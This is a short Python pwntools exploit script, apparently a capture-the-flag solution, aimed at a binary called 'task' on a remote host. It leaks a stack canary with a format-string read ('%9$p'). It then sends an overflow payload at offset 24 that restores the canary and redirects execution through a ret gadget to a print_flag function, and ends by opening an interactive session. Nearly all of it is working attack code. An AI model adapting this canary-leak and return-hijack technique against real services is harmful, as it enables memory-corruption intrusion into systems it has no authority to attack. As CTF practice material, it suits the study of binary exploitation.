from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'debug'
context.terminal = 'kitty'

offset = 24

p = remote('rivit.dev', 10015)
# p = gdb.debug('./task')

p.sendlineafter('First: ', "%9$p")
canary = int(p.recvuntil('S').decode().strip('S'), 16)
log.info("canary, %#x", canary)

payload = flat({
    offset: [
        canary,
        0,
        0x000000000040101a,
        elf.sym.print_flag
        ]
    })

p.sendline(payload)

p.interactive()
